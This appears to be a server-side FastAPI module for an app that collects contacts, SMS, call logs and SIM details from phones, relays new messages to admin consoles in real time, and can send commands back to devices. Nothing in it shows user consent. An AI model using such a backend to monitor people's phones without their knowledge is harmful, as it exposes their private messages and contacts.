"""数据采集存储 API：通讯录 / 短信 / 通话记录。

三类「设备数据」的 REST 端点，模式与 ``locations.py`` 完全一致：
- 设备上报：``POST /api/contacts | /api/sms | /api/calllogs``（设备头鉴权，
  与 WS hello 同一套注册表校验）
- 管理查询：``GET ...``（管理员鉴权）
- 手动清理：``DELETE ...``（管理员鉴权）

三个存储的语义差异（详见各 store 模块 docstring）：
- contacts / calllogs：按设备**覆盖快照**（当前状态）
- sms：**累积去重**（历史存档，(device_id, sms_key) 唯一键）
"""

from __future__ import annotations

import logging
import time
from typing import Any, Optional

from fastapi import APIRouter, Depends, Header, HTTPException, Query, Request, status
from pydantic import BaseModel, Field

from app.api.v1.admin import require_admin
from app.core.calllog_store import CallLogStore
from app.core.contacts_store import ContactsStore
from app.core.sim_store import SimStore
from app.core.sms_store import SmsStore

logger = logging.getLogger(__name__)

# 新短信事件去重：最近 60s 内广播过的 (device_id, sms_key) -> 广播时刻(monotonic)。
# 客户端 ContentObserver 会多次触发导致同一批短信重复上报，靠它拦截重复通知。
_RECENT_SMS_BROADCAST: dict[tuple[str, str], float] = {}

# 不设 prefix：三个领域共用一个文件，路径各自写全领域段；
# 聚合层（app/api/v1/router.py）统一加 /api 前缀
router = APIRouter(tags=["data"])


# ----------------------------------------------------------------------
# 请求 / 响应模型
# ----------------------------------------------------------------------


class ContactItem(BaseModel):
    contact_key: str = ""
    name: str = ""
    phones: list[str] = Field(default_factory=list)
    emails: list[str] = Field(default_factory=list)


class ContactsReportRequest(BaseModel):
    contacts: list[ContactItem] = Field(default_factory=list)


class DataReportResponse(BaseModel):
    total: int
    sync_time: str = ""


class SmsItem(BaseModel):
    sms_key: str = ""
    address: str = ""
    body: str = ""
    type: int = 1
    date_ms: int = 0
    read: bool = False
    sim_slot: int = -1
    sim_number: str = ""


class SmsReportRequest(BaseModel):
    messages: list[SmsItem] = Field(default_factory=list)


class SmsReportResponse(BaseModel):
    received: int
    inserted: int
    updated: int


class DataListResponse(BaseModel):
    total: int
    items: list[dict]
    sync_time: Optional[str] = None


class SmsListResponse(BaseModel):
    total: int
    items: list[dict]


class SmsReadRequest(BaseModel):
    """批量设置存档已读状态（双向）。"""
    device_id: str
    ids: list[int] = Field(default_factory=list)
    read: bool = True


class SmsReadResponse(BaseModel):
    updated: int


class DeleteResponse(BaseModel):
    deleted: int


class CallLogItem(BaseModel):
    call_key: str = ""
    number: str = ""
    name: str = ""
    type: int = 1
    duration: int = 0
    date_ms: int = 0
    location: str = ""
    sim_slot: int = -1
    sim_number: str = ""


class CallLogReportRequest(BaseModel):
    records: list[CallLogItem] = Field(default_factory=list)


class SimItemIn(BaseModel):
    slot_index: int = 0
    subscription_id: int = 0
    number: str = ""
    carrier: str = ""


class SimReportRequest(BaseModel):
    sims: list[SimItemIn] = Field(default_factory=list)


class SimListResponse(BaseModel):
    total: int
    items: list[dict]
    sync_time: Optional[str] = None


# ----------------------------------------------------------------------
# 依赖与工具
# ----------------------------------------------------------------------


def _get_stores(request: Request) -> tuple[ContactsStore, SmsStore, CallLogStore]:
    return (
        request.app.state.contacts_store,
        request.app.state.sms_store,
        request.app.state.calllog_store,
    )


def _sim_store(request: Request) -> SimStore:
    return request.app.state.sim_store


def _check_device_auth(request: Request, device_id: str | None, token: str | None) -> str:
    """设备鉴权（auth.enabled 时生效），返回已认证的 device_id。"""
    settings = request.app.state.settings
    if not settings.auth.enabled:
        return device_id or ""
    registry = request.app.state.device_registry
    if not device_id or not token or not registry.authenticate(device_id, token):
        logger.warning("数据上报鉴权失败：device=%s", device_id or "unknown")
        raise HTTPException(status.HTTP_401_UNAUTHORIZED, detail="设备鉴权失败")
    return device_id


def _store_unavailable(e: Exception) -> HTTPException:
    logger.error("数据存储不可用：%s", e)
    return HTTPException(status.HTTP_503_SERVICE_UNAVAILABLE, detail="数据存储暂不可用")


# ----------------------------------------------------------------------
# 通讯录
# ----------------------------------------------------------------------


@router.post("/contacts", response_model=DataReportResponse)
def report_contacts(
    body: ContactsReportRequest,
    request: Request,
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> DataReportResponse:
    """设备上报通讯录（整体覆盖该设备快照）。"""
    device_id = _check_device_auth(request, x_device_id, x_device_token)
    store = _get_stores(request)[0]
    try:
        result = store.replace_snapshot(
            device_id, [c.model_dump() for c in body.contacts]
        )
    except Exception as e:
        raise _store_unavailable(e) from e
    return DataReportResponse(**result)


@router.get("/contacts", response_model=DataListResponse, dependencies=[Depends(require_admin)])
def list_contacts(
    request: Request,
    device_id: str = Query(min_length=1),
    keyword: str = Query(default=""),
    limit: int = Query(default=500, ge=1, le=5000),
    offset: int = Query(default=0, ge=0),
) -> DataListResponse:
    items, total, sync_time = _get_stores(request)[0].list(
        device_id=device_id, keyword=keyword.strip(), limit=limit, offset=offset
    )
    return DataListResponse(total=total, items=items, sync_time=sync_time)


@router.delete("/contacts", response_model=DeleteResponse, dependencies=[Depends(require_admin)])
def delete_contacts(request: Request, device_id: str = Query(min_length=1)) -> DeleteResponse:
    try:
        return DeleteResponse(deleted=_get_stores(request)[0].delete(device_id))
    except Exception as e:
        raise _store_unavailable(e) from e


# ----------------------------------------------------------------------
# 短信
# ----------------------------------------------------------------------


@router.post("/sms", response_model=SmsReportResponse)
async def report_sms(
    body: SmsReportRequest,
    request: Request,
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> SmsReportResponse:
    """设备上报一批短信（去重入库），有新短信入库时广播 new_sms 事件给管理侧。

    注意：本端点为 async def（而非其它数据端点那样的同步 def），是因为它需要
    在主事件循环里广播 new_sms 事件（asyncio.create_task）。阻塞的 MySQL 写入
    经 run_in_executor 转线程池，避免阻塞事件循环。
    """
    device_id = _check_device_auth(request, x_device_id, x_device_token)
    store = _get_stores(request)[1]
    messages = [m.model_dump() for m in body.messages]

    import asyncio

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(None, store.save_batch, device_id, messages)
    except Exception as e:
        raise _store_unavailable(e) from e

    # 逐条广播真正新增的短信（new_messages 已含具体内容），供管理侧逐条提醒。
    # 客户端 ContentObserver 会多次触发、批量上报，靠「逐条 + 事件去重」避免
    # 同一条短信重复通知（2026-10-28 修复「一条短信通知多次」）。
    for msg in result.get("new_messages", []):
        await _publish_new_sms(request, device_id, msg)

    return SmsReportResponse(**result)


async def _publish_new_sms(request: Request, device_id: str, msg: dict) -> None:
    """广播单条新短信事件给已连接的管理后台（失败仅记日志，不影响上报）。

    ``msg`` 为 ``save_batch`` 返回的 ``new_messages`` 中的一项，含
    ``sms_key/address/body/type/date_ms``。用内存级去重集合（最近 60s 内广播过
    的 (device_id, sms_key)）拦截客户端重复上报导致的重复广播。
    """
    bus = getattr(request.app.state, "admin_event_bus", None)
    if bus is None:
        logger.warning("new_sms 广播跳过：admin_event_bus 未装配")
        return

    sms_key = str(msg.get("sms_key") or "")
    dedup_key = (device_id, sms_key)
    now = time.monotonic()
    # 清理过期条目（60s 窗口）
    expired = [k for k, t in _RECENT_SMS_BROADCAST.items() if now - t > 60]
    for k in expired:
        _RECENT_SMS_BROADCAST.pop(k, None)
    if dedup_key in _RECENT_SMS_BROADCAST:
        logger.info("new_sms 跳过（60s 内已广播过）：device=%s sms_key=%s", device_id, sms_key)
        return
    _RECENT_SMS_BROADCAST[dedup_key] = now

    payload = {
        "device_id": device_id,
        "address": (msg.get("address") or ""),
        "body": (msg.get("body") or ""),
        "sms_type": int(msg.get("type") or 1),
        "sms_key": sms_key,
    }
    try:
        await bus.publish("new_sms", payload)
        logger.info("new_sms 事件已广播：device=%s address=%s sms_key=%s 活跃管理端=%d",
                    device_id, payload["address"], sms_key, bus.active_count)
    except Exception:
        logger.exception("发布 new_sms 事件失败（忽略）")


@router.get("/sms", response_model=SmsListResponse, dependencies=[Depends(require_admin)])
def list_sms(
    request: Request,
    device_id: Optional[str] = Query(default=None),
    sms_type: Optional[int] = Query(default=None, ge=1, le=6),
    keyword: str = Query(default=""),
    before_ms: Optional[int] = Query(default=None),
    limit: int = Query(default=100, ge=1, le=1000),
) -> SmsListResponse:
    """短信存档查询。``device_id`` 为空 = 聚合模式（返回所有设备，2026-10-28）。"""
    items, total = _get_stores(request)[1].list(
        device_id=device_id,
        sms_type=sms_type,
        keyword=keyword.strip(),
        before_ms=before_ms,
        limit=limit,
    )
    return SmsListResponse(total=total, items=items)


@router.delete("/sms", response_model=DeleteResponse, dependencies=[Depends(require_admin)])
def delete_sms(
    request: Request,
    device_id: str = Query(min_length=1),
    row_id: Optional[int] = Query(default=None),
) -> DeleteResponse:
    try:
        return DeleteResponse(deleted=_get_stores(request)[1].delete(device_id, row_id))
    except Exception as e:
        raise _store_unavailable(e) from e


@router.put("/sms/read", response_model=SmsReadResponse, dependencies=[Depends(require_admin)])
def set_sms_read(body: SmsReadRequest, request: Request) -> SmsReadResponse:
    """批量标记存档短信为已读/未读（双向）。

    仅更新服务端存档的已读标记；如需同步设备端短信库，另行下发
    ``mark_sms_read`` 命令（mode=by_id，ID 取存档的 ``sms_key`` 字段）。
    """
    try:
        updated = _get_stores(request)[1].set_read(body.device_id, body.ids, body.read)
    except Exception as e:
        raise _store_unavailable(e) from e
    return SmsReadResponse(updated=updated)


# ----------------------------------------------------------------------
# 短信聚合（客户端 APK 用，设备认证；2026-10-28 拍板：APK 短信页默认聚合
# 显示所有设备的存档，可切回本机视图）
# ----------------------------------------------------------------------


@router.get("/device/sms_threads")
def device_sms_threads(
    request: Request,
    keyword: str = Query(default=""),
    limit: int = Query(default=200, ge=1, le=1000),
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> dict:
    """跨设备聚合会话列表（会话键 = 设备+号码），按最新消息倒序。"""
    _check_device_auth(request, x_device_id, x_device_token)
    try:
        items, total = _get_stores(request)[1].list_threads(
            keyword=keyword, limit=limit,
        )
    except Exception as e:
        raise _store_unavailable(e) from e
    return {"total": total, "items": items}


@router.get("/device/sms_messages")
def device_sms_messages(
    request: Request,
    device_id: str = Query(min_length=1),
    address: str = Query(min_length=1),
    before_ms: Optional[int] = Query(default=None),
    limit: int = Query(default=100, ge=1, le=1000),
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> dict:
    """某会话（设备+号码）的消息分页（倒序），聚合详情页用。"""
    _check_device_auth(request, x_device_id, x_device_token)
    try:
        items, total = _get_stores(request)[1].list_messages(
            device_id=device_id, address=address, before_ms=before_ms, limit=limit,
        )
    except Exception as e:
        raise _store_unavailable(e) from e
    return {"total": total, "items": items}


# ----------------------------------------------------------------------
# 通话记录
# ----------------------------------------------------------------------


@router.post("/calllogs", response_model=DataReportResponse)
def report_calllogs(
    body: CallLogReportRequest,
    request: Request,
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> DataReportResponse:
    """设备上报通话记录（整体覆盖该设备快照）。"""
    device_id = _check_device_auth(request, x_device_id, x_device_token)
    store = _get_stores(request)[2]
    try:
        result = store.replace_snapshot(
            device_id, [r.model_dump() for r in body.records]
        )
    except Exception as e:
        raise _store_unavailable(e) from e
    return DataReportResponse(**result)


@router.get("/calllogs", response_model=DataListResponse, dependencies=[Depends(require_admin)])
def list_calllogs(
    request: Request,
    device_id: str = Query(min_length=1),
    call_type: Optional[int] = Query(default=None, ge=1, le=6),
    keyword: str = Query(default=""),
    limit: int = Query(default=200, ge=1, le=2000),
    offset: int = Query(default=0, ge=0),
) -> DataListResponse:
    items, total, sync_time = _get_stores(request)[2].list(
        device_id=device_id, call_type=call_type, keyword=keyword.strip(),
        limit=limit, offset=offset,
    )
    return DataListResponse(total=total, items=items, sync_time=sync_time)


@router.delete("/calllogs", response_model=DeleteResponse, dependencies=[Depends(require_admin)])
def delete_calllogs(request: Request, device_id: str = Query(min_length=1)) -> DeleteResponse:
    try:
        return DeleteResponse(deleted=_get_stores(request)[2].delete(device_id))
    except Exception as e:
        raise _store_unavailable(e) from e


# ----------------------------------------------------------------------
# SIM 卡信息
# ----------------------------------------------------------------------


@router.post("/sims", response_model=DataReportResponse)
def report_sims(
    body: SimReportRequest,
    request: Request,
    x_device_id: str | None = Header(default=None),
    x_device_token: str | None = Header(default=None),
) -> DataReportResponse:
    """设备上报 SIM 卡信息（整体覆盖该设备快照）。"""
    device_id = _check_device_auth(request, x_device_id, x_device_token)
    try:
        result = _sim_store(request).replace_snapshot(
            device_id, [s.model_dump() for s in body.sims]
        )
    except Exception as e:
        raise _store_unavailable(e) from e
    return DataReportResponse(**result)


@router.get("/sims", response_model=SimListResponse, dependencies=[Depends(require_admin)])
def list_sims(request: Request, device_id: str = Query(min_length=1)) -> SimListResponse:
    items, sync_time = _sim_store(request).list(device_id)
    return SimListResponse(total=len(items), items=items, sync_time=sync_time)


@router.delete("/sims", response_model=DeleteResponse, dependencies=[Depends(require_admin)])
def delete_sims(request: Request, device_id: str = Query(min_length=1)) -> DeleteResponse:
    try:
        return DeleteResponse(deleted=_sim_store(request).delete(device_id))
    except Exception as e:
        raise _store_unavailable(e) from e
